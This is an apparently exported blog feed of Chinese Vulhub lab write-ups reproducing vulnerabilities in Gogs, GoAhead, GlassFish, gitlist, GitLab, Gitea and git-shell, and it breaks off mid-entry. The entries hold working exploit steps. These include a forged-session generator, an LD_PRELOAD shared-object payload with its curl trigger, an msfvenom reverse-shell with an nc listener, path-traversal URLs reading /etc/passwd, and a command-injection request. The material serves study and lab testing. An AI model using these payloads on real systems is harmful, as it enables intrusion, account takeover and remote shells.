<p>其0.11.66及以前版本中，（go-macaron/session库）没有对sessionid进行校验，攻击者利用恶意sessionid即可读取任意文件，通过控制文件内容来控制session内容，进而登录任意账户。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://github.com/gogs/gogs/issues/5469" target="_blank" rel="noopener">https://github.com/gogs/gogs/issues/5469</a></li>
<li><a href="https://xz.aliyun.com/t/3168" target="_blank" rel="noopener">https://xz.aliyun.com/t/3168</a></li>
<li><a href="https://www.anquanke.com/post/id/163575" target="_blank" rel="noopener">https://www.anquanke.com/post/id/163575</a></li>
</ul>
<a id="more"></a>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，访问<code>http://192.168.44.132:3000</code>，即可看到安装页面。安装时选择sqlite数据库，并开启注册功能。</p>
<p>安装完成后，需要重启服务：<code>docker-compose restart</code>，否则session是存储在内存中的。</p>
<p>使用Gob序列化生成session文件：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"bytes"</span></span><br><span class="line">    <span class="string">"encoding/gob"</span></span><br><span class="line">    <span class="string">"encoding/hex"</span></span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"io/ioutil"</span></span><br><span class="line">    <span class="string">"os"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">EncodeGob</span><span class="params">(obj <span class="keyword">map</span>[<span class="keyword">interface</span>&#123;&#125;]<span class="keyword">interface</span>&#123;&#125;)</span> <span class="params">([]<span class="keyword">byte</span>, error)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> _, v := <span class="keyword">range</span> obj &#123;</span><br><span class="line">        gob.Register(v)</span><br><span class="line">    &#125;</span><br><span class="line">    buf := bytes.NewBuffer(<span class="literal">nil</span>)</span><br><span class="line">    err := gob.NewEncoder(buf).Encode(obj)</span><br><span class="line">    <span class="keyword">return</span> buf.Bytes(), err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> uid <span class="keyword">int64</span> = <span class="number">1</span></span><br><span class="line">    obj := <span class="keyword">map</span>[<span class="keyword">interface</span>&#123;&#125;]<span class="keyword">interface</span>&#123;&#125;&#123;<span class="string">"_old_uid"</span>: <span class="string">"1"</span>, <span class="string">"uid"</span>: uid, <span class="string">"uname"</span>: <span class="string">"admin1"</span>&#125;</span><br><span class="line">    data, err := EncodeGob(obj)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">    &#125;</span><br><span class="line">    err = ioutil.WriteFile(<span class="string">"poc"</span>, data, os.O_CREATE|os.O_WRONLY)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">    &#125;</span><br><span class="line">    edata := hex.EncodeToString(data)</span><br><span class="line">    fmt.Println(edata)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后注册一个普通用户账户，创建项目，并在“版本发布”页面上传刚生成的session文件：</p>
<p><img src="https://image.3001.net/images/20210809/16285012095663.png" alt="image-20210809164054788"></p>
<p>通过这个附件的URL，得知这个文件的文件名：<code>./attachments/f3768c6e-2798-478d-affa-719958a8c94a</code>。</p>
<p><img src="https://image.3001.net/images/20210809/16285012132101.png" alt="image-20210809164628830"></p>
<p>然后，构造Cookie：<code>i_like_gogits=../attachments/f/3/f3768c6e-2798-478d-affa-719958a8c94a</code>，访问即可发现已经成功登录id=1的用户（即管理员）。</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>Gogs</tag>
      </tags>
  </entry>
  <entry>
    <title>GoAhead Web 服务器 HTTPd &#39;LD_PRELOAD&#39; 远程代码执行 (CVE-2017-17562)</title>
    <url>/2021/08/05/GoAhead%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8%20HTTPd%20&#39;LD_PRELOAD&#39;%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%20(CVE-2017-17562)/</url>
    <content><![CDATA[<h1 id="GoAhead-Web-服务器-HTTPd-‘LD-PRELOAD’-远程代码执行-CVE-2017-17562"><a href="#GoAhead-Web-服务器-HTTPd-‘LD-PRELOAD’-远程代码执行-CVE-2017-17562" class="headerlink" title="GoAhead Web 服务器 HTTPd ‘LD_PRELOAD’ 远程代码执行 (CVE-2017-17562)"></a>GoAhead Web 服务器 HTTPd ‘LD_PRELOAD’ 远程代码执行 (CVE-2017-17562)</h1><p>Embedthis GoAhead 是世界上最流行的微型嵌入式 Web 服务器，部署在数亿台设备中，是最小嵌入式设备的理想选择。</p>
<p>如果启用 CGI 并且动态链接 CGI 程序，则 3.6.5 之前的 GoAhead 允许远程代码执行。这是在<code>cgi.c</code>. 当与 glibc 动态链接器结合使用时，这种行为可能会被滥用用于使用特殊参数名称的远程代码执行，例如<code>LD_PRELOAD</code>. 攻击者可以在请求正文中发布他们的共享对象负载，并使用 /proc/self/fd/0 引用它。</p>
<p>参考：</p>
<ul>
<li><a href="https://www.elttam.com.au/blog/goahead/" target="_blank" rel="noopener">https://www.elttam.com.au/blog/goahead/</a></li>
<li><a href="https://www.exploit-db.com/exploits/43360" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/43360</a></li>
<li><a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/goahead_ldpreload.rb" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/goahead_ldpreload.rb</a></li>
</ul>
<a id="more"></a>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>然后，您可以看到欢迎页面在<code>http://192.168.44.132:8080</code>，CGI 脚本在<code>http://192.168.44.132:8080/cgi-bin/index</code>处可用。</p>
<p>首先，将这段劫持代码编译成动态共享库：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">before_main</span><span class="params">(<span class="keyword">void</span>)</span> __<span class="title">attribute__</span><span class="params">((constructor))</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">before_main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">"Hello: World!\n"</span>, <span class="number">14</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>请注意，由于 GoAhead 是运行在几乎所有可能的 IoT 设备上的紧凑型嵌入式 Web 服务器，因此动态共享库的格式始终取决于目标服务器架构。在现实世界中，虽然 Vulhub 可以向您展示一个最简单的示例，但编译漏洞并不像本手册所建议的那么容易。</p>
</blockquote>
<p>在 x86/64 环境下编译：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC .&#x2F;payload.c -o payload.so</span><br></pre></td></tr></table></figure>

<p>使用 curl 触发攻击：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -X POST --data-binary @payload.so &quot;http:&#x2F;&#x2F;192.168.44.132:8080&#x2F;cgi-bin&#x2F;index?LD_PRELOAD&#x3D;&#x2F;proc&#x2F;self&#x2F;fd&#x2F;0&quot; -i</span><br></pre></td></tr></table></figure>

<p><code>Hello: world!</code>打印响应头以指示代码已执行：</p>
<p><img src="https://image.3001.net/images/20210809/16284917299525.png" alt="image-20210806154725109"></p>
<p>可以编译反弹shell，poc：</p>
<p><a href="https://github.com/ivanitlearning/CVE-2017-17562" target="_blank" rel="noopener">https://github.com/ivanitlearning/CVE-2017-17562</a></p>
<p>执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; msfvenom -a x64 --platform Linux -p linux&#x2F;x64&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.49.2 LPORT&#x3D;4444 -f elf-so -o payload.so</span><br><span class="line"></span><br><span class="line">&gt; python exploit.py -rhost 192.168.49.2 -rport 8080 -cgipath &#x2F;cgi-bin&#x2F;index -payload payload.so</span><br><span class="line"></span><br><span class="line">&gt; nc -lvvp 4444</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210809/16284917324878.png" alt="image-20210806172818326"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>GoAhead</tag>
      </tags>
  </entry>
  <entry>
    <title>GlassFish 任意文件读取漏洞</title>
    <url>/2021/08/05/GlassFish%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="GlassFish-任意文件读取漏洞"><a href="#GlassFish-任意文件读取漏洞" class="headerlink" title="GlassFish 任意文件读取漏洞"></a>GlassFish 任意文件读取漏洞</h1><p>java语言中会把<code>%c0%ae</code>解析为<code>\uC0AE</code>，最后转义为ASCCII字符的<code>.</code>（点）。利用<code>%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/</code>来向上跳转，达到目录穿越、任意文件读取的效果。</p>
<p>参考文章：<a href="https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904" target="_blank" rel="noopener">https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904</a></p>
<a id="more"></a>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境运行后，访问<code>http://192.168.44.132:8080</code>和<code>http://192.168.44.132:4848</code>即可查看web页面。其中，8080端口是网站内容，4848端口是GlassFish管理中心。</p>
<p>访问<code>https://192.168.44.132:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd</code>，发现已成功读取<code>/etc/passwd</code>内容：</p>
<p><img src="https://image.3001.net/images/20210809/16284911395978.png" alt="image-20210806105221808"></p>
<h2 id="额外说明"><a href="#额外说明" class="headerlink" title="额外说明"></a>额外说明</h2><p>本环境超级管理员密码在<code>docker-compose.yml</code>中设置，默认为<code>vulhub_default_password</code>，在4848端口利用该密码可以登录管理员账户。</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>GlassFish</tag>
      </tags>
  </entry>
  <entry>
    <title>gitlist 0.6.0 远程命令执行漏洞（CVE-2018-1000533）</title>
    <url>/2021/08/04/gitlist%200.6.0%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-1000533%EF%BC%89/</url>
    <content><![CDATA[<h1 id="gitlist-0-6-0-远程命令执行漏洞（CVE-2018-1000533）"><a href="#gitlist-0-6-0-远程命令执行漏洞（CVE-2018-1000533）" class="headerlink" title="gitlist 0.6.0 远程命令执行漏洞（CVE-2018-1000533）"></a>gitlist 0.6.0 远程命令执行漏洞（CVE-2018-1000533）</h1><p>gitlist是一款使用PHP开发的图形化git仓库查看工具。在其0.6.0版本及以前，存在一处命令参数注入问题，可以导致远程命令执行漏洞。</p>
<a id="more"></a>

<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>在用户对仓库中代码进行搜索的时候，gitlist将调用<code>git grep</code>命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public function searchTree($query, $branch)</span><br><span class="line">&#123;</span><br><span class="line">    if (empty($query)) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $query &#x3D; escapeshellarg($query);</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        $results &#x3D; $this-&gt;getClient()-&gt;run($this, &quot;grep -i --line-number &#123;$query&#125; $branch&quot;);</span><br><span class="line">    &#125; catch (\RuntimeException $e) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>其中，<code>$query</code>是搜索的关键字，<code>$branch</code>是搜索的分支。</p>
<p>如果用户输入的<code>$query</code>的值是<code>--open-files-in-pager=id;</code>，将可以执行<code>id</code>命令：</p>
<p><img src="https://image.3001.net/images/20210805/16281327613722.png" alt="img"></p>
<p>导致这个漏洞的原因，有几点：</p>
<ol>
<li>开发者对于<code>escapeshellarg</code>函数的误解，造成参数注入</li>
<li><code>git grep</code>的参数<code>--open-files-in-pager</code>的值，将被直接执行</li>
</ol>
<p>理论上，在经过<code>$query = escapeshellarg($query);</code>处理后，<code>$query</code>将变成一个由单引号包裹的字符串。但不出漏洞的前提是，这个字符串应该出现在“参数值”的位置，而不是出现在参数选项（option）中。</p>
<p>我们可以试一下如下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git grep -i --line-number -e &#39;--open-files-in-pager&#x3D;id;&#39; master</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210805/16281327634508.png" alt="img"></p>
<p>如上图，我将<code>$query</code>放在了<code>-e</code>参数的值的位置，此时它就仅仅是一个字符串而已，并不会被当成参数<code>--open-files-in-pager</code>。</p>
<p>这应该作为本漏洞的最佳修复方法，也是git官方对pattern可能是用户输入的情况的一种解决方案（以下说明来自man-page）：</p>
<blockquote>
<p>-e The next parameter is the pattern. This option has to be used for patterns starting with - and should be used in scripts passing user input to grep. Multiple patterns are combined by or.</p>
</blockquote>
<p>当然，gitlist的开发者用了另一种修复方案：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public function searchTree($query, $branch)</span><br><span class="line">&#123;</span><br><span class="line">    if (empty($query)) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">    $query &#x3D; preg_replace(&#39;&#x2F;(--?[A-Za-z0-9\-]+)&#x2F;&#39;, &#39;&#39;, $query);</span><br><span class="line">    $query &#x3D; escapeshellarg($query);</span><br><span class="line">    try &#123;</span><br><span class="line">        $results &#x3D; $this-&gt;getClient()-&gt;run($this, &quot;grep -i --line-number -- &#123;$query&#125; $branch&quot;);</span><br><span class="line">    &#125; catch (\RuntimeException $e) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>首先用<code>preg_replace</code>将<code>-</code>开头的非法字符移除，然后将<code>$query</code>放在<code>--</code>的后面。在命令行解析器中，<code>--</code>的意思是，此后的部分不会再包含参数选项（option）：</p>
<blockquote>
<p>A – signals the end of options and disables further option processing. Any arguments after the – are treated as filenames and arguments. An argument of - is equivalent to –.</p>
<p>If arguments remain after option processing, and neither the -c nor the -s option has been supplied, the first argument is assumed to be the name of a file containing shell commands. If bash is invoked in this fashion, $0 is set to the name of the file, and the positional parameters are set to the remaining arguments. Bash reads and executes commands from this file, then exits. Bash’s exit status is the exit status of the last command executed in the script. If no commands are executed, the exit status is 0. An attempt is first made to open the file in the current directory, and, if no file is found, then the shell searches the directories in PATH for the script.</p>
</blockquote>
<p>举个简单的例子，如果我们需要查看一个文件名是<code>--name</code>的文件，我们就不能用<code>cat --name</code>来读取，也不能用<code>cat &#39;--name&#39;</code>，而必须要用<code>cat -- --name</code>。从这个例子也能看出，单引号并不是区分一个字符串是“参数值”或“选项”的标准。</p>
<p><img src="https://image.3001.net/images/20210805/16281327679883.png" alt="img"></p>
<p>所以官方这个修复方案也是可以接受的，只不过第一步的<code>preg_replace</code>有点影响正常搜索功能。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，访问<code>http://192.168.44.132:8080</code>将看到一个名为<code>example</code>的仓库。</p>
<p>发送如下数据包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;example&#x2F;tree&#x2F;a&#x2F;search HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:8080</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;64.0.3282.186 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Content-Length: 56</span><br><span class="line"></span><br><span class="line">query&#x3D;--open-files-in-pager&#x3D;touch &#x2F;tmp&#x2F;success;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210805/16281327701311.png" alt="image-20210804173533567"></p>
<p>其中，我们访问的是<code>/example/tree/a/search</code>，example是项目名称，需要是目标gitlist上一个已存在的项目；a在正常情况下应该是分支的名称，也就是<code>&quot;grep -i --line-number {$query} $branch&quot;</code>中的<code>$branch</code>，但因为我们的<code>$query</code>被当成了一个参数，所以<code>$branch</code>就应该被当做搜索的关键字。</p>
<p>如果没有搜索结果的话，我们的命令是不会被执行的，所以我用了“a”这个关键字，只是为了保证能搜出结果，你也可以换成其他的试试。</p>
<p>数据包发送后，用<code>docker-compose exec web bash</code>进入容器中，可见<code>/tmp/success</code>已成功创建：</p>
<p><img src="https://image.3001.net/images/20210805/1628132773176.png" alt="image-20210804173513039"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>gitlist</tag>
      </tags>
  </entry>
  <entry>
    <title>Gitlab 任意文件读取漏洞（CVE-2016-9086）</title>
    <url>/2021/08/04/Gitlab%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-9086%EF%BC%89/</url>
    <content><![CDATA[<h1 id="Gitlab-任意文件读取漏洞（CVE-2016-9086）"><a href="#Gitlab-任意文件读取漏洞（CVE-2016-9086）" class="headerlink" title="Gitlab 任意文件读取漏洞（CVE-2016-9086）"></a>Gitlab 任意文件读取漏洞（CVE-2016-9086）</h1><p>Gitlab版本：8.13.1</p>
<p>原理剖析：<a href="http://paper.seebug.org/104/" target="_blank" rel="noopener">http://paper.seebug.org/104/</a></p>
<a id="more"></a>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>请使用2G及以上内存的VPS或虚拟机运行该环境，实测1G内存的机器无法正常运行Gitlab（运行后502错误）。</p>
<p>环境运行后，Web端口为10080，ssh端口为10022。访问<code>http://192.168.44.132:10080</code>，设置管理员（用户名<code>root</code>）密码，登录。</p>
<p>新建一个项目，点击<code>GitLab export</code>：</p>
<p><img src="https://image.3001.net/images/20210805/16281316728341.png" alt="image-20210804170511510"></p>
<p>将<a href="https://github.com/vulhub/vulhub/blob/master/gitlab/CVE-2016-9086/test.tar.gz" target="_blank" rel="noopener">test.tar.gz</a>上传，将会读取到<code>/etc/passwd</code>文件内容：</p>
<p><img src="https://image.3001.net/images/20210805/16281316747815.png" alt="image-20210804170856925"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>Gitlab</tag>
      </tags>
  </entry>
  <entry>
    <title>Gitea 1.4.0 目录穿越导致命令执行漏洞</title>
    <url>/2021/08/04/Gitea%201.4.0%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E5%AF%BC%E8%87%B4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="Gitea-1-4-0-目录穿越导致命令执行漏洞"><a href="#Gitea-1-4-0-目录穿越导致命令执行漏洞" class="headerlink" title="Gitea 1.4.0 目录穿越导致命令执行漏洞"></a>Gitea 1.4.0 目录穿越导致命令执行漏洞</h1><p>Gitea是从gogs衍生出的一个开源项目，是一个类似于Github、Gitlab的多用户Git仓库管理平台。其1.4.0版本中有一处逻辑错误，导致未授权用户可以穿越目录，读写任意文件，最终导致执行任意命令。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://security.szurek.pl/gitea-1-4-0-unauthenticated-rce.html" target="_blank" rel="noopener">https://security.szurek.pl/gitea-1-4-0-unauthenticated-rce.html</a></li>
<li><a href="https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html</a></li>
</ul>
<a id="more"></a>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，访问<code>http:/192.168.44.132:3000</code>，将进入安装页面，填写管理员账号密码，并修改网站URL，其他的用默认配置安装即可。（不要修改端口号）</p>
<p>安装完成后，创建一个公开的仓库，随便添加点文件进去（比如使用选定的文件和模板初始化仓库）：</p>
<p><img src="https://image.3001.net/images/20210805/16281313988525.png" alt="image-20210804154233163"></p>
<p>然后，需要执行一次<code>docker-compose restart</code>重启gitea服务。（原因详见第二个参考链接）</p>
<p>由于漏洞链整体利用比较复杂，我们只复现文件读取部分，剩余利用方法详见第二个参考链接。</p>
<p>打开gitea，找到刚才创建的公开项目，如admin1/repo，发送如下数据包，添加一个Git LFS对象：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;admin1&#x2F;repo.git&#x2F;info&#x2F;lfs&#x2F;objects HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:3000</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: application&#x2F;vnd.git-lfs+json</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 151</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;Oid&quot;: &quot;......&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&quot;,</span><br><span class="line">    &quot;Size&quot;: 1000000,</span><br><span class="line">    &quot;User&quot; : &quot;a&quot;,</span><br><span class="line">    &quot;Password&quot; : &quot;a&quot;,</span><br><span class="line">    &quot;Repo&quot; : &quot;a&quot;,</span><br><span class="line">    &quot;Authorization&quot; : &quot;a&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210805/16281314015406.png" alt="image-20210804154818003"></p>
<p>然后，访问<code>http://192.168.44.132:3000/admin1/repo.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sth</code>，即可看到<code>/etc/passwd</code>已被成功读取：</p>
<p><img src="https://image.3001.net/images/20210805/16281314055909.png" alt="image-20210804154843852"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>Gitea</tag>
      </tags>
  </entry>
  <entry>
    <title>GIT-SHELL 沙盒绕过（CVE-2017-8386）</title>
    <url>/2021/08/03/GIT-SHELL%20%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87%EF%BC%88CVE-2017-8386%EF%BC%89/</url>
    <content><![CDATA[<h1 id="GIT-SHELL-沙盒绕过（CVE-2017-8386）"><a href="#GIT-SHELL-沙盒绕过（CVE-2017-8386）" class="headerlink" title="GIT-SHELL 沙盒绕过（CVE-2017-8386）"></a>GIT-SHELL 沙盒绕过（CVE-2017-8386）</h1><p>GIT-SHELL 沙盒绕过（CVE-2017-8386）导致任意文件读取、可能的任意命令执行漏洞。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://insinuator.net/2017/05/git-shell-bypass-by-abusing-less-cve-2017-8386/" target="_blank" rel="noopener">https://insinuator.net/2017/05/git-shell-bypass-by-abusing-less-cve-2017-8386/</a></li>
<li><a href="https://www.leavesongs.com/PENETRATION/git-shell-cve-2017-8386.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/git-shell-cve-2017-8386.html</a></li>
</ul>
<a id="more"></a>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>为了不和docker母机的ssh端口冲突，我将容器的ssh端口设置成3322。本目录下我生成了一个<code>id_rsa</code>，这是ssh的私钥，连接的时候请指定之。</p>
<p>在连接以前，需要先设置私钥的权限为0600：<code>chmod 0600 id_rsa</code>，否则连接可能失败。</p>
<p>正常连接其ssh服务<code>ssh -p 3322 -i id_rsa git@127.0.0.1</code>，会被git-shell给拦截，返回错误<code>fatal: unrecognized command &#39;&#39;</code>，并且连接被关闭。</p>
<p>使用–help技巧，连接目标并进入帮助页面：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -p 3322 -i id_rsa -t git@127.0.0.1 &quot;git-upload-archive &#39;--help&#39;&quot;</span><br></pre></td></tr></table></figure>

<p>按<code>shift</code>+e，读取任意文件：</p>
<p><img src="https://image.3001.net/images/20210803/16279955969623.png" alt="image-20210803170619933"></p>
<p>回到帮助页面，输入<code>!id</code>执行命令：</p>
<p><img src="https://image.3001.net/images/20210803/1627995599820.png" alt="image-20210803170710064"></p>
<p>(为什么是www-data用户？因为git用户和www-data用户编号都是33，所以其实他们是一个用户)</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="基于ssh协议的git拉取流程"><a href="#基于ssh协议的git拉取流程" class="headerlink" title="基于ssh协议的git拉取流程"></a>基于ssh协议的git拉取流程</h3><p>git-shell是git服务中重要的组成部分，众所周知，git服务支持ssh、git、https三种协议来传递项目，其中ssh是最安全，也最方便的一种方式。</p>
<p>我们随便打开Github上一个项目，找到<code>Clone with SSH</code>里列出的地址：:phith0n/vulhub.git，其实这个url就是告诉git，ssh用户名是git，地址是github.com（默认端口是22），该项目位于<code>phith0n/vulhub.git</code>这个目录下；然后git就通过ssh协议连接上github.com，并将对应目录下的项目拉取下来。</p>
<p>所以，基于ssh协议的git clone等操作，本质上就是通过ssh协议连接上git服务器，并将指定目录拉取下来的过程。</p>
<p>那么，既然这个过程是个ssh交互的过程，那么我直接执行<code>ssh git@github.com</code>是不是就可以登录github服务器了呢？显然是不行的，你可以试试：</p>
<p>说“不行”其实也有偏差，实际上我确实是连接上了其ssh服务，并验证身份通过了，但他给了我一段提示信息“Hi phith0n! You’ve successfully authenticated, but GitHub does not provide shell access.”，就把我的连接关了。</p>
<p>所以，正常来说，基于ssh的git拉取过程对于git服务器是安全的。</p>
<p>关于如何搭建一个git服务器，可以参考<a href="http://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000/00137583770360579bc4b458f044ce7afed3df579123eca000" target="_blank" rel="noopener">这篇文章</a></p>
<h3 id="如何禁止git用户执行系统shell"><a href="#如何禁止git用户执行系统shell" class="headerlink" title="如何禁止git用户执行系统shell"></a>如何禁止git用户执行系统shell</h3><p>那么，github这类git服务商是怎么实现上述“安全”通信的流程的呢？</p>
<p>让用户可以通过ssh认证身份，但又不给用户shell，这个过程有两种方法实现：</p>
<ol>
<li>创建系统用户git的时候将其shell设置成git-shell</li>
<li>在authorized_keys文件每个ssh-key的前面设置command，覆盖或劫持重写原本的命令</li>
</ol>
<p>第一种方法比较直观，就是创建用户的时候不给其正常的bash或sh的shell，而是给它一个git-shell。git-shell是一个沙盒环境，在git-shell下，只允许执行沙盒内包含的命令。</p>
<p>第二种方法不仅在git服务器上使用，很多Linux发行版也会用到。比如aws，默认安装后是不允许root登录的，实现方法就是在/root/.ssh/authorized_keys中设置<code>command=&quot;echo &#39;Please login as the user \&quot;ec2-user\&quot; rather than the user \&quot;root\&quot;.&#39;;echo;sleep 10&quot;</code>。这句话相当于覆盖了原本执行的shell，变成了echo一段文字。</p>
<p>当然，第二种方法内也可以用git-shell，比如在添加git用户的时候赋予其正常的<code>/bin/bash</code>，但在authorized_keys中设置<code>command=&quot;git-shell -c \&quot;$SSH_ORIGINAL_COMMAND\&quot;&quot;</code>，实际上还是使用了git-shell。</p>
<h3 id="git-shell-沙盒绕过漏洞（CVE-2017-8386）"><a href="#git-shell-沙盒绕过漏洞（CVE-2017-8386）" class="headerlink" title="git-shell 沙盒绕过漏洞（CVE-2017-8386）"></a>git-shell 沙盒绕过漏洞（CVE-2017-8386）</h3><p>git-shell是一个可以限制用户执行命令的shell，如果我们在git用户家目录下创建一个新目录，叫<code>git-shell-commands</code>，然后将你允许用户执行的命令放在这个目录下，这就创建好了一个沙盒。在git-shell中，只能执行<code>/home/git/git-shell-commands</code>目录下的命令。</p>
<p>如果系统是没有<code>git-shell-commands</code>目录，那么git-shell默认只允许执行如下三个命令：</p>
<ul>
<li><code>git-receive-pack &lt;argument&gt;</code></li>
<li><code>git-upload-pack &lt;argument&gt;</code></li>
